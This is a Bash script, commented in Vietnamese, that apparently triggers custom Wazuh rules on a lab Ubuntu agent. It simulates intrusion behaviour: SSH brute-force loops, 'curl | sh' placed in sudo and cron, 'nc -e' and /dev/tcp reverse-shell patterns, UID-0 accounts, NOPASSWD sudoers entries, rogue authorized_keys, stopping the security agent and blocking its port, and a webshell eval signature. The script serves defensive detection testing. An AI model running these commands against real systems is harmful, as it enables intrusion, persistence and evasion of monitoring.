#!/usr/bin/env bash
# =====================================================================
# ubuntu-trigger.sh  (v2)  -  Tu dong sinh hanh vi kiem thu rule Wazuh
# May: ubuntu-lab (agent 014, 192.168.19.129, Ubuntu 24.04)
# CHI DUNG TRONG LAB. Payload vo hai.
#
# v2: dung EXPECT lai terminal that (go mat khau nhu nguoi) de tai hien
#     dung log ma rule can. Sua logic mat khau cho cac ca sudoers/su.
#
# Cach dung (root):
#   sudo ./ubuntu-trigger.sh prep     # tao tai khoan thu + cai sshpass, expect
#   sudo ./ubuntu-trigger.sh 13.1     # chay 1 ca
#   sudo ./ubuntu-trigger.sh hv13     # chay ca hanh vi
#   sudo ./ubuntu-trigger.sh all
#   sudo ./ubuntu-trigger.sh clean
#
# Dashboard:  agent.id: "014" and rule.id: <ID>
# =====================================================================
set -u

SELF_IP="192.168.19.129"
TESTPW="Lab@123456"
GAP=3
LOG="trigger-ubuntu-$(date +%Y%m%d-%H%M%S).csv"

if [ "$(id -u)" -ne 0 ]; then echo "Phai chay bang root: sudo $0 $*"; exit 1; fi

mark() {
  local t; t=$(date '+%Y-%m-%d %H:%M:%S')
  printf '\n>>> %s | [%s] rule mong doi: %s\n    %s\n' "$t" "$1" "$2" "$3"
  if [ ! -f "$LOG" ]; then echo '"thoi_gian","host","ca","rule_mong_doi","mo_ta"' > "$LOG"; fi
  printf '"%s","ubuntu-lab","%s","%s","%s"\n' "$t" "$1" "$2" "$3" >> "$LOG"
}
pause() { sleep "$GAP"; }

# chay mot kich ban expect duoi danh nghia <user> (qua pty that, khong can mat khau cua user do vi dang la root)
exp_as() { # <user> <expect-program>
  local u="$1" prog="$2"
  local f="/tmp/lt_$$_${RANDOM}.exp"
  printf '%s\n' "$prog" > "$f"; chmod 644 "$f"
  runuser -u "$u" -- expect -f "$f" >/dev/null 2>&1
  rm -f "$f"
}

# =====================================================================
# CHUAN BI
# =====================================================================
do_prep() {
  echo "== Cai cong cu =="
  apt-get update -qq
  apt-get install -y -qq sshpass expect netcat-traditional >/dev/null 2>&1
  echo "== Tao tai khoan thu =="
  id labsudo     >/dev/null 2>&1 || useradd -m -s /bin/bash -G sudo labsudo
  id labnosudo   >/dev/null 2>&1 || useradd -m -s /bin/bash labnosudo
  id labrestrict >/dev/null 2>&1 || useradd -m -s /bin/bash labrestrict
  echo "labsudo:$TESTPW"     | chpasswd
  echo "labnosudo:$TESTPW"   | chpasswd
  echo "labrestrict:$TESTPW" | chpasswd
  echo 'labrestrict ALL=(ALL) /usr/bin/ls' > /etc/sudoers.d/labrestrict
  chmod 440 /etc/sudoers.d/labrestrict
  # dam bao sshd cho dang nhap bang mat khau (can cho brute force)
  if ! grep -qE '^\s*PasswordAuthentication\s+yes' /etc/ssh/sshd_config; then
    sed -i 's/^#\?\s*PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config
    systemctl restart ssh 2>/dev/null
  fi
  visudo -c >/dev/null && echo "sudoers OK. Xong chuan bi."
}
do_clean() {
  rm -f /etc/sudoers.d/labrestrict
  userdel -r labsudo 2>/dev/null; userdel -r labnosudo 2>/dev/null; userdel -r labrestrict 2>/dev/null
  echo "Da xoa tai khoan thu."
}

# =====================================================================
# HV13 - sudo/su that bai  (EXPECT = pty that)
# =====================================================================
# gui sai mat khau N lan roi bo cuoc (Ctrl-C) -> sinh "N incorrect password attempts"
c_13_1(){ mark 13.1 100500 "sudo sai 1 lan roi bo cuoc (labsudo)"
  exp_as labsudo 'spawn sudo -k id
expect "assword"
send "saibet1\r"
expect "assword"
send "\003"
expect eof'; }

c_13_2(){ mark 13.2 100501 "sudo sai 3 lan trong 1 lenh (labsudo)"
  exp_as labsudo 'spawn sudo -k id
expect "assword"
send "saibet1\r"
expect "assword"
send "saibet2\r"
expect "assword"
send "saibet3\r"
expect eof'; }

c_13_3(){ mark 13.3 100504 "4 luot sudo that bai trong 5 phut (labsudo)"
  for i in 1 2 3 4; do c_once_fail labsudo; sleep 2; done; }
c_once_fail(){ exp_as "$1" 'spawn sudo -k id
expect "assword"
send "saibet\r"
expect "assword"
send "\003"
expect eof'; }

c_13_4(){ mark 13.4 "100502,100505" "labnosudo go DUNG mat khau nhung khong co quyen sudo (3 lan)"
  for i in 1 2 3; do
    exp_as labnosudo "spawn sudo -k id
expect \"assword\"
send \"$TESTPW\r\"
expect eof"
    sleep 2
  done; }

c_13_5(){ mark 13.5 100503 "labrestrict chay lenh khong duoc phep (cat /etc/shadow)"
  exp_as labrestrict "spawn sudo -k cat /etc/shadow
expect \"assword\"
send \"$TESTPW\r\"
expect eof"; }

c_13_6(){ mark 13.6 100506 "tai khoan dich vu www-data thu sudo"
  exp_as www-data 'spawn sudo -k id
expect "assword"
send "saibet\r"
expect "assword"
send "\003"
expect eof'; }

c_13_7(){ mark 13.7 100507 "sudo thanh cong ngay sau chuoi that bai (labsudo)"
  c_once_fail labsudo; sleep 1; c_once_fail labsudo; sleep 1
  exp_as labsudo "spawn sudo -k id
expect \"assword\"
send \"$TESTPW\r\"
expect eof"; }

c_13_8(){ mark 13.8 "100508,100509,100510" "su that bai: 1 lan len labsudo + 5 lan len root"
  exp_as labnosudo 'spawn su - labsudo
expect "assword"
send "saibet\r"
expect eof'
  for i in 1 2 3 4 5; do
    exp_as labnosudo 'spawn su - root
expect "assword"
send "saibet\r"
expect eof'
    sleep 1
  done; }

hv13(){ c_13_1;pause;c_13_2;pause;c_13_3;pause;c_13_4;pause;c_13_5;pause;c_13_6;pause;c_13_7;pause;c_13_8; }

# =====================================================================
# HV1 ca 1.5 / HV12 - SSH brute force (sshpass, tai khoan LOCAL labsudo)
# srcip = 192.168.19.129 (tu-thu).
# =====================================================================
ssh_fail(){ sshpass -p "sai$RANDOM" ssh -o PreferredAuthentications=password \
  -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$1@$SELF_IP" true >/dev/null 2>&1; }
c_1_5(){ mark 1.5 "100112,100114" "12 lan SSH sai tai khoan labsudo (lan 10 -> 100114)"
  for i in $(seq 1 12); do ssh_fail labsudo; done; }
c_12_1(){ mark 12.1 100487 "6 lan SSH root sai mat khau (100480/100482 la rule dang nhap root THANH CONG, khong ap dung)"
  for i in $(seq 1 6); do ssh_fail root; sleep 1; done; }
hv1_ssh(){ c_1_5; }
hv12(){ c_12_1; }

# =====================================================================
# HV5 Linux
# =====================================================================
c_5_11(){ mark 5.11 100357 "sudo chay chuoi curl|sh (vo hai, ket noi bi tu choi)"
  exp_as labsudo "spawn sudo -k sh -c {curl -s http://127.0.0.1:9/x | sh}
expect \"assword\"
send \"$TESTPW\r\"
expect eof"; }
c_5_12(){ mark 5.12 "100356,100357" "nc.traditional -e (reverse shell gia) + qua sudo"
  nc.traditional -e /bin/true 127.0.0.1 9 >/dev/null 2>&1
  exp_as labsudo "spawn sudo -k nc.traditional -e /bin/true 127.0.0.1 9
expect \"assword\"
send \"$TESTPW\r\"
expect eof"; }
hv5_linux(){ c_5_11; pause; c_5_12; }

# =====================================================================
# HV2 Linux - SSH dang nhap thanh cong sau nhieu lan sai (100123-100125)
# =====================================================================
ssh_ok(){ sshpass -p "$2" ssh -o PreferredAuthentications=password \
  -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$1@$SELF_IP" true >/dev/null 2>&1; }

c_2_4(){ mark 2.4 100123 "6 lan SSH sai roi dang nhap dung (labsudo)"
  for i in 1 2 3 4 5 6; do ssh_fail labsudo; sleep 1; done
  ssh_ok labsudo "$TESTPW"; }

c_2_5(){ mark 2.5 "100124,100125" "11 lan SSH sai roi dang nhap dung (labnosudo)"
  for i in $(seq 1 11); do ssh_fail labnosudo; done
  sleep 1
  ssh_ok labnosudo "$TESTPW"; }

c_2_6(){ mark 2.6 "100123,100124,100125,100119" "9 sai+dung (labsudo), 14 sai+dung (labnosudo), 20 sai nua roi dung: vuot nguong frequency+1"
  for i in $(seq 1 9); do ssh_fail labsudo; done; sleep 1; ssh_ok labsudo "$TESTPW"
  sleep 3
  for i in $(seq 1 14); do ssh_fail labnosudo; done; sleep 1; ssh_ok labnosudo "$TESTPW"
  sleep 3
  for i in $(seq 1 20); do ssh_fail labsudo; done; sleep 1; ssh_ok labsudo "$TESTPW"; }

lo_fail(){ sshpass -p "sai$RANDOM" ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$1@127.0.0.1" true >/dev/null 2>&1; }
lo_ok(){ sshpass -p "$2" ssh -o PreferredAuthentications=password -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$1@127.0.0.1" true >/dev/null 2>&1; }
c_2_7(){ mark 2.7 100124 "13 lan sai roi dung tu 127.0.0.1 (allow-list IP nen 100123 bi bo qua, 100124 theo tai khoan van xet)"
  for i in $(seq 1 13); do lo_fail labnosudo; done; sleep 1; lo_ok labnosudo "$TESTPW"; }
c_2_8(){ mark 2.8 100125 "30 lan sai nhanh (100114 nho nhieu lan), cho 16 phut (het cua so 100123/100124), roi dang nhap dung, ~18 phut"
  for i in $(seq 1 30); do ssh_fail labsudo; done; sleep 960; ssh_ok labsudo "$TESTPW"; }
c_1_7(){ mark 1.7 100119 "36 lan sai cham (25s/lan), luan phien 6 tai khoan de khong dinh 100114/100117, ~15 phut"
  for i in $(seq 1 6); do for u in labsudo labnosudo labtest3 labtest4 labtest5 labtest6; do ssh_fail $u; sleep 25; done; done; }

# ---- setup (chay bang root qua script nay) ----
setup_show_syscheck(){ sed -n '/<syscheck>/,/<\/syscheck>/p' /var/ossec/etc/ossec.conf | grep -vE '^\s*<!--|^\s*$' | head -60; }
setup_fim(){ cp -p /var/ossec/etc/ossec.conf /var/ossec/etc/ossec.conf.bak-20261125
  grep -q 'ld.so.preload' /var/ossec/etc/ossec.conf || sed -i 's|</syscheck>|  <directories realtime="yes" report_changes="yes">/etc/ld.so.preload</directories>\n  </syscheck>|' /var/ossec/etc/ossec.conf
  [ -e /etc/ld.so.preload ] || : > /etc/ld.so.preload
  systemctl restart wazuh-agent; sleep 5; systemctl is-active wazuh-agent; grep -c 'ld.so.preload' /var/ossec/etc/ossec.conf; }
setup_whodata(){ cp -p /var/ossec/etc/ossec.conf /var/ossec/etc/ossec.conf.bak2-20261125
  sed -i 's|,/var/www/html</directories>|</directories>|' /var/ossec/etc/ossec.conf
  grep -q 'whodata="yes".*var/www/html' /var/ossec/etc/ossec.conf || sed -i 's|</syscheck>|  <directories whodata="yes" report_changes="yes">/var/www/html</directories>\n  </syscheck>|' /var/ossec/etc/ossec.conf
  systemctl restart wazuh-agent; sleep 8; systemctl is-active wazuh-agent; grep -n 'var/www/html' /var/ossec/etc/ossec.conf; }
c_14_9(){ mark 14.9 "100521,100522,100523,100533" "xoa file, tao moi, sua, them eval(), roi www-data chay lenh (whodata)"
  rm -f /var/www/html/lab_test.php; sleep 5
  printf '<?php echo "lab1"; ?>\n' > /var/www/html/lab_test.php; sleep 6
  printf '// lab2\n' >> /var/www/html/lab_test.php; sleep 6
  printf '<?php /* eval($_GET["x"]); */ ?>\n' >> /var/www/html/lab_test.php; sleep 6
  runuser -u www-data -- /bin/ls /tmp >/dev/null 2>&1; sleep 2
  runuser -u www-data -- /usr/bin/id >/dev/null 2>&1; sleep 4; }
c_14_10(){ mark 14.10 "100521,100522" "tao file PHP vo hai roi sua noi dung vo hai (khong eval) de khong bi 100523 chiem (whodata)"
  rm -f /var/www/html/lab_benign.php; sleep 5
  printf '<?php echo "ok"; ?>\n' > /var/www/html/lab_benign.php; sleep 6
  printf '// them dong\n' >> /var/www/html/lab_benign.php; sleep 6
  rm -f /var/www/html/lab_benign.php; sleep 3; }
c_15_9(){ mark 15.9 "100549,100550,100551,100552" "bat tam auditd connect (khoa soc_outbound_connect), chay 15.8, roi go lai de tranh nhieu"
  printf '%s\n' '-a always,exit -F arch=b64 -S connect -F a2=16 -F success=1 -k soc_outbound_connect' > /etc/audit/rules.d/99-soc-outbound.rules
  augenrules --load >/dev/null 2>&1; sleep 3
  c_15_8; sleep 8
  rm -f /etc/audit/rules.d/99-soc-outbound.rules; augenrules --load >/dev/null 2>&1; }
setup_clamav(){ export DEBIAN_FRONTEND=noninteractive
  apt-get install -y clamav clamav-daemon >/tmp/setup_clamav.log 2>&1; echo "apt exit=$?"
  systemctl stop clamav-freshclam 2>/dev/null; freshclam >>/tmp/setup_clamav.log 2>&1; echo "freshclam exit=$?"
  grep -q '^LogSyslog true' /etc/clamav/clamd.conf || echo 'LogSyslog true' >> /etc/clamav/clamd.conf
  systemctl enable --now clamav-daemon >>/tmp/setup_clamav.log 2>&1; sleep 15; systemctl is-active clamav-daemon; tail -3 /tmp/setup_clamav.log; }
c_16_9(){ mark 16.9 100608 "ClamAV (clamdscan) phat hien EICAR"
  printf '%s' 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*' > /tmp/lab_eicar.com
  chmod 644 /tmp/lab_eicar.com; clamdscan /tmp/lab_eicar.com >/dev/null 2>&1; sleep 3; rm -f /tmp/lab_eicar.com; }
c_6_10(){ mark 6.10 100376 "kill -9 clamd: systemd bao dich vu bao mat thoat bat thuong"
  kill -9 $(pidof clamd) 2>/dev/null; sleep 8; systemctl restart clamav-daemon; }

hv2_linux(){ c_2_4; pause; c_2_5; }

# =====================================================================
# HV3 Linux - tao/sua/xoa tai khoan (100311-100315)
# =====================================================================
c_3_9(){ mark 3.9 "100311,100312" "tao tai khoan UID 0 (labuid0) va tai khoan trong nhom sudo (labadm1)"
  useradd -o -u 0 -g 0 -M -N labuid0 2>/dev/null
  sleep 1
  useradd -M -G sudo labadm1 2>/dev/null
  sleep 1
  userdel -f labuid0 2>/dev/null
  userdel labadm1 2>/dev/null; }

c_3_10(){ mark 3.10 100313 "doi UID tai khoan co san thanh 0 (labmod0)"
  useradd -M labmod0 2>/dev/null
  sleep 1
  usermod -o -u 0 labmod0 2>/dev/null
  sleep 1
  userdel -f labmod0 2>/dev/null; }

c_3_11(){ mark 3.11 "100314,100315" "xoa 5 tai khoan Linux trong 10 phut (labdel1..5)"
  for i in 1 2 3 4 5; do useradd -M "labdel$i" 2>/dev/null; done
  sleep 1
  for i in 1 2 3 4 5; do userdel "labdel$i" 2>/dev/null; sleep 1; done; }

hv3_linux(){ c_3_9; pause; c_3_10; pause; c_3_11; }

# =====================================================================
# HV4 Linux - them vao nhom dac quyen & sua sudoers (100328-100332)
# =====================================================================
c_4_6(){ mark 4.6 "100328,100329,100330" "them labnosudo vao sudo bang gpasswd, usermod va qua sudo"
  gpasswd -a labnosudo sudo >/dev/null 2>&1
  sleep 1
  gpasswd -d labnosudo sudo >/dev/null 2>&1
  sleep 1
  usermod -aG sudo labnosudo >/dev/null 2>&1
  sleep 1
  gpasswd -d labnosudo sudo >/dev/null 2>&1
  sleep 1
  exp_as labsudo "spawn sudo -k usermod -aG sudo labnosudo
expect \"assword\"
send \"$TESTPW\r\"
expect eof"
  sleep 1
  gpasswd -d labnosudo sudo >/dev/null 2>&1; }

c_4_7(){ mark 4.7 "100331,100332" "tao file trong /etc/sudoers.d co NOPASSWD: ALL (FIM)"
  echo '# lab test' > /etc/sudoers.d/labtest_nopw
  chmod 440 /etc/sudoers.d/labtest_nopw
  sleep 8
  echo 'labnosudo ALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers.d/labtest_nopw
  sleep 8
  rm -f /etc/sudoers.d/labtest_nopw; }

hv4_linux(){ c_4_6; pause; c_4_7; }

# =====================================================================
# HV10 Linux - cron va systemd unit (FIM: 100457, 100458)
# =====================================================================
c_10_8(){ mark 10.8 100457 "them file cron va unit systemd (FIM)"
  printf '# lab test\n* * * * * root /bin/true\n' > /etc/cron.d/lab_test_job
  printf '[Unit]\nDescription=Lab Test\n[Service]\nExecStart=/bin/true\n' > /etc/systemd/system/lab-test.service
  sleep 5
  rm -f /etc/cron.d/lab_test_job /etc/systemd/system/lab-test.service; }

c_10_9(){ mark 10.9 100458 "sua file cron da ton tai them lenh tai curl|sh (FIM report_changes)"
  printf '# lab test\n' > /etc/cron.d/lab_dl_job
  sleep 5
  printf '0 0 1 1 * root curl -s http://127.0.0.1:9/x | sh\n' >> /etc/cron.d/lab_dl_job
  sleep 5
  rm -f /etc/cron.d/lab_dl_job; }

hv10_linux(){ c_10_8; pause; c_10_9; }

# =====================================================================
# HV12 Linux (bo sung) - SSH root THANH CONG (tam bat PermitRootLogin roi tat)
# =====================================================================
root_ssh_enable() {
  cp /etc/ssh/sshd_config /tmp/sshd_config.lab.bak
  echo "root:$TESTPW" | chpasswd
  if grep -qE '^\s*#?\s*PermitRootLogin' /etc/ssh/sshd_config; then
    sed -i 's/^\s*#\?\s*PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
  else
    echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config
  fi
  systemctl restart ssh 2>/dev/null
  sleep 1
}
root_ssh_restore() {
  if [ -f /tmp/sshd_config.lab.bak ]; then
    mv /tmp/sshd_config.lab.bak /etc/ssh/sshd_config
    systemctl restart ssh 2>/dev/null
  fi
  passwd -l root >/dev/null 2>&1
}

c_12_2(){ mark 12.2 "100480,100481,100482,100486" "SSH root dang nhap THANH CONG bang mat khau (tam bat roi tat)"
  root_ssh_enable
  ssh_ok root "$TESTPW"
  sleep 1
  root_ssh_restore; }

c_12_3(){ mark 12.3 100489 "SSH root sai 3 lan roi dang nhap THANH CONG bang mat khau"
  root_ssh_enable
  for i in 1 2 3; do ssh_fail root; sleep 1; done
  ssh_ok root "$TESTPW"
  sleep 1
  root_ssh_restore; }

c_12_4(){ mark 12.4 "100482,100483" "SSH root bang KHOA cong khai tu ngoai allow-list (100482) va tu 127.0.0.1 ngoai gio (100483)"
  root_ssh_enable
  mkdir -p /root/.ssh && chmod 700 /root/.ssh
  [ -f /root/.ssh/authorized_keys ] && cp /root/.ssh/authorized_keys /tmp/root_ak.lab.bak
  rm -f /tmp/lab_root_key /tmp/lab_root_key.pub
  ssh-keygen -t ed25519 -N "" -f /tmp/lab_root_key -q
  cat /tmp/lab_root_key.pub >> /root/.ssh/authorized_keys
  chmod 600 /root/.ssh/authorized_keys
  ssh -i /tmp/lab_root_key -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o StrictHostKeyChecking=no "root@$SELF_IP" true >/dev/null 2>&1
  sleep 2
  ssh -i /tmp/lab_root_key -o IdentitiesOnly=yes -o PreferredAuthentications=publickey -o StrictHostKeyChecking=no "root@127.0.0.1" true >/dev/null 2>&1
  sleep 1
  if [ -f /tmp/root_ak.lab.bak ]; then mv /tmp/root_ak.lab.bak /root/.ssh/authorized_keys; else rm -f /root/.ssh/authorized_keys; fi
  rm -f /tmp/lab_root_key /tmp/lab_root_key.pub
  root_ssh_restore; }

c_12_5(){ mark 12.5 100480 "SSH root bang KHOA tu 127.0.0.1 (trong allow-list, ngoai gio 7pm-6am se ra 100483, chay sau 06:00 ngay thuong)"
  local K=/tmp/lab12_5key AK=/root/.ssh/authorized_keys
  rm -f $K $K.pub; ssh-keygen -q -t ed25519 -N "" -f $K
  mkdir -p /root/.ssh; [ -f $AK ] && cp -p $AK /tmp/lab12_5.ak.bak
  cat $K.pub >> $AK
  ssh -i $K -o IdentitiesOnly=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 root@127.0.0.1 true >/dev/null 2>&1
  sleep 1
  if [ -f /tmp/lab12_5.ak.bak ]; then mv /tmp/lab12_5.ak.bak $AK; else rm -f $AK; fi
  rm -f $K $K.pub; }

hv12_ok(){ c_12_2; pause; c_12_3; pause; c_12_4; }

# =====================================================================
# HV15 Linux - ket noi ra ngoai & reverse shell qua auditd (100549-100552)
# =====================================================================
c_15_8(){ mark 15.8 "100549,100550,100551,100552" "bash + binary trong /tmp ket noi ra ngoai + chuoi reverse shell (auditd)"
  bash -c 'timeout 3 bash -c "exec 3<>/dev/tcp/1.1.1.1/443" 2>/dev/null || true'
  cp /usr/bin/curl /tmp/lab_tmp_curl 2>/dev/null && chmod +x /tmp/lab_tmp_curl
  /tmp/lab_tmp_curl -s -m 3 https://1.1.1.1 -o /dev/null 2>/dev/null || true
  rm -f /tmp/lab_tmp_curl
  bash -c 'echo "/dev/tcp/1.1.1.1/4444" >/dev/null'
  nc.traditional -e /bin/true 127.0.0.1 9 >/dev/null 2>&1 || true; }

hv15_linux(){ c_15_8; }

# =====================================================================
# HV7 Linux - dung agent & chan cong 1514 qua sudo (100388, 100391)
# =====================================================================
c_7_7(){ mark 7.7 100388 "sudo disable roi enable lai wazuh-agent"
  exp_as labsudo "spawn sudo -k systemctl disable wazuh-agent
expect \"assword\"
send \"$TESTPW\r\"
expect eof"
  sleep 2
  systemctl enable wazuh-agent 2>/dev/null || true; }

c_7_8(){ mark 7.8 100391 "sudo iptables chan cong 1514 roi go ngay"
  exp_as labsudo "spawn sudo -k iptables -A OUTPUT -p tcp --dport 1514 -j DROP
expect \"assword\"
send \"$TESTPW\r\"
expect eof"
  sleep 1
  iptables -D OUTPUT -p tcp --dport 1514 -j DROP 2>/dev/null || true; }

hv7_linux(){ c_7_8; pause; c_7_7; }

c_6_9(){ mark 6.9 100375 "sudo dung dich vu bao mat Linux (falcon-sensor gia)"
  exp_as labsudo "spawn sudo -k systemctl stop falcon-sensor
expect \"assword\"
send \"$TESTPW\r\"
expect eof" || true; }

c_9_5(){ mark 9.5 100425 "sua noi dung /etc/ld.so.preload (FIM realtime, file rong san co sau setup_fim) roi tra ve rong"
  echo '# lab' > /etc/ld.so.preload
  sleep 6
  : > /etc/ld.so.preload; }

# =====================================================================
# HV9 Linux - FIM file he thong quan trong (100422, 100423, 100425-100429, 100431, 100433)
# =====================================================================
c_9_1(){ mark 9.1 100429 "sua /etc/hosts (FIM)"
  cp /etc/hosts /tmp/hosts.lab.bak
  echo "# lab-fim-test" >> /etc/hosts
  sleep 4
  mv /tmp/hosts.lab.bak /etc/hosts; }

c_9_3(){ mark 9.3 100422 "them khoa gia vao /home/labsudo/.ssh/authorized_keys (FIM)"
  mkdir -p /home/labsudo/.ssh
  [ -f /home/labsudo/.ssh/authorized_keys ] && cp /home/labsudo/.ssh/authorized_keys /tmp/ak.lab.bak
  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILabTestKeyDummy0000000000000000000000000000 lab@test" >> /home/labsudo/.ssh/authorized_keys
  sleep 4
  if [ -f /tmp/ak.lab.bak ]; then mv /tmp/ak.lab.bak /home/labsudo/.ssh/authorized_keys; else rm -f /home/labsudo/.ssh/authorized_keys; fi; }

c_9_4(){ mark 9.4 100423 "them file cau hinh sshd_config.d (FIM)"
  echo "# lab-fim-test" > /etc/ssh/sshd_config.d/99-lab-fim.conf
  sleep 4
  rm -f /etc/ssh/sshd_config.d/99-lab-fim.conf; }

c_9_6(){ mark 9.6 100425 "tao /etc/ld.so.preload rong (vo hai, FIM)"
  : > /etc/ld.so.preload
  sleep 4
  rm -f /etc/ld.so.preload; }

c_9_7(){ mark 9.7 "100426,100433" "them cau hinh ld.so.conf.d va modprobe.d (FIM)"
  echo "# lab-fim-test" > /etc/ld.so.conf.d/lab-fim.conf
  echo "# lab-fim-test" > /etc/modprobe.d/lab-fim.conf
  sleep 4
  rm -f /etc/ld.so.conf.d/lab-fim.conf /etc/modprobe.d/lab-fim.conf; }

c_9_8(){ mark 9.8 "100427,100428" "sua file khoi dong shell (/etc/profile.d va .bashrc)"
  echo "# lab-fim-test" > /etc/profile.d/lab-fim.sh
  cp /home/labsudo/.bashrc /tmp/bashrc.lab.bak 2>/dev/null || true
  echo "# lab-fim-test" >> /home/labsudo/.bashrc
  sleep 4
  rm -f /etc/profile.d/lab-fim.sh
  [ -f /tmp/bashrc.lab.bak ] && mv /tmp/bashrc.lab.bak /home/labsudo/.bashrc; }

c_9_9(){ mark 9.9 100431 "tao file moi trong /usr/bin (FIM)"
  echo "#!/bin/sh" > /usr/bin/lab_fim_dummy
  sleep 4
  rm -f /usr/bin/lab_fim_dummy; }

hv9_linux(){ c_9_1; pause; c_9_3; pause; c_9_4; pause; c_9_6; pause; c_9_7; pause; c_9_8; pause; c_9_9; }

# =====================================================================
# HV14 Linux - Webshell FIM & Auditd (100521-100523, 100530, 100531, 100533)
# =====================================================================
c_14_1(){ mark 14.1 100521 "tao file PHP moi trong /var/www/html (FIM 554)"
  mkdir -p /var/www/html
  printf '<?php echo "lab1"; ?>\n' > /var/www/html/lab_test.php
  sleep 4; }

c_14_2(){ mark 14.2 100522 "sua file PHP co san trong /var/www/html (FIM 550)"
  printf '// lab2\n' >> /var/www/html/lab_test.php
  sleep 4; }

c_14_3(){ mark 14.3 100523 "them chu ky ham eval() vao file PHP (FIM report_changes)"
  printf '<?php /* eval($_GET["x"]); */ ?>\n' >> /var/www/html/lab_test.php
  sleep 4; }

c_14_6(){ mark 14.6 "100530,100531,100533" "tai khoan web www-data chay lenh ls/whoami/id (auditd + tuong quan)"
  runuser -u www-data -- /bin/ls /tmp >/dev/null 2>&1
  sleep 1
  runuser -u www-data -- /usr/bin/whoami >/dev/null 2>&1
  sleep 1
  runuser -u www-data -- /usr/bin/id >/dev/null 2>&1
  sleep 2
  rm -f /var/www/html/lab_test.php; }

c_14_4(){ mark 14.4 "100520,100524,100525" "HTTP GET webshell URI + 25 POST 200 toi cmd.php (nginx)"
  mkdir -p /var/www/html
  printf 'ok\n' > /var/www/html/cmd.php
  printf 'ok\n' > /var/www/html/index2.php
  cp /etc/nginx/sites-enabled/default /tmp/nginx-default.lab.bak 2>/dev/null || true
  if ! grep -q "error_page 405 =200" /etc/nginx/sites-enabled/default 2>/dev/null; then
    sed -i 's|location / {|location / {\n\t\terror_page 405 =200 $uri;|' /etc/nginx/sites-enabled/default
    systemctl reload nginx 2>/dev/null || true
  fi
  sleep 1
  curl -s "http://$SELF_IP/cmd.php?cmd=whoami" -o /dev/null
  for i in $(seq 1 25); do
    curl -s -X POST "http://$SELF_IP/index2.php" -d "a=$i" -o /dev/null
  done
  sleep 2
  if [ -f /tmp/nginx-default.lab.bak ]; then
    mv /tmp/nginx-default.lab.bak /etc/nginx/sites-enabled/default
    systemctl reload nginx 2>/dev/null || true
  fi
  rm -f /var/www/html/cmd.php /var/www/html/index2.php; }

c_16_1(){ mark 16.1 "100600,100601" "tao file trong /etc/profile.d trung MD5/SHA256 trong soc-ioc-hashes"
  printf 'lab-ioc-test-2026\n' > /etc/profile.d/lab-ioc-hash.sh
  sleep 5
  rm -f /etc/profile.d/lab-ioc-hash.sh; }

hv14_linux(){ c_14_1; pause; c_14_2; pause; c_14_3; pause; c_14_4; pause; c_14_6; }

# =====================================================================
linux_extra(){ hv2_linux; pause; hv3_linux; pause; hv4_linux; pause; hv10_linux; pause; hv12_ok; pause; hv15_linux; }
chang3_linux(){ hv9_linux; pause; hv14_linux; }
run_all(){ hv13; pause; hv1_ssh; pause; hv12; pause; hv5_linux; pause; linux_extra; }

case "${1:-}" in
  prep) do_prep ;; clean) do_clean ;; all) run_all ;; linux_extra) linux_extra ;; chang3) chang3_linux ;;
  hv13) hv13 ;; hv12) hv12 ;; hv12_ok) hv12_ok ;; hv5) hv5_linux ;;
  hv2) hv2_linux ;; hv3) hv3_linux ;; hv4) hv4_linux ;; hv7) hv7_linux ;; hv9) hv9_linux ;; hv10) hv10_linux ;; hv14) hv14_linux ;; hv15) hv15_linux ;;
  1.5) c_1_5 ;; 2.4) c_2_4 ;; 2.5) c_2_5 ;; 2.6) c_2_6 ;; 16.9) c_16_9 ;; 6.10) c_6_10 ;; setup_clamav) setup_clamav ;; setup_fim) setup_fim ;; setup_whodata) setup_whodata ;; 14.9) c_14_9 ;; 15.9) c_15_9 ;; 14.10) c_14_10 ;; setup_show_syscheck) setup_show_syscheck ;; 2.7) c_2_7 ;; 2.8) c_2_8 ;; 1.7) c_1_7 ;;
  3.9) c_3_9 ;; 3.10) c_3_10 ;; 3.11) c_3_11 ;;
  4.6) c_4_6 ;; 4.7) c_4_7 ;;
  5.11) c_5_11 ;; 5.12) c_5_12 ;;
  7.7) c_7_7 ;; 7.8) c_7_8 ;; 6.9) c_6_9 ;; 9.5) c_9_5 ;;
  9.1) c_9_1 ;; 9.3) c_9_3 ;; 9.4) c_9_4 ;; 9.6) c_9_6 ;; 9.7) c_9_7 ;; 9.8) c_9_8 ;; 9.9) c_9_9 ;;
  10.8) c_10_8 ;; 10.9) c_10_9 ;;
  12.1) c_12_1 ;; 12.2) c_12_2 ;; 12.3) c_12_3 ;; 12.4) c_12_4 ;; 12.5) c_12_5 ;;
  13.1) c_13_1 ;; 13.2) c_13_2 ;; 13.3) c_13_3 ;; 13.4) c_13_4 ;;
  13.5) c_13_5 ;; 13.6) c_13_6 ;; 13.7) c_13_7 ;; 13.8) c_13_8 ;;
  14.1) c_14_1 ;; 14.2) c_14_2 ;; 14.3) c_14_3 ;; 14.4) c_14_4 ;; 14.6) c_14_6 ;;
  15.8) c_15_8 ;; 16.1) c_16_1 ;;
  *) echo "Dung: sudo $0 {prep|clean|all|linux_extra|chang3|hv2..hv15|<ca>}"; exit 1 ;;
esac
[ -f "$LOG" ] && echo && echo "== Bang chung: $(pwd)/$LOG =="
echo 'Dashboard: agent.id: "014" and rule.id: <ID>  (Last 15 minutes)'
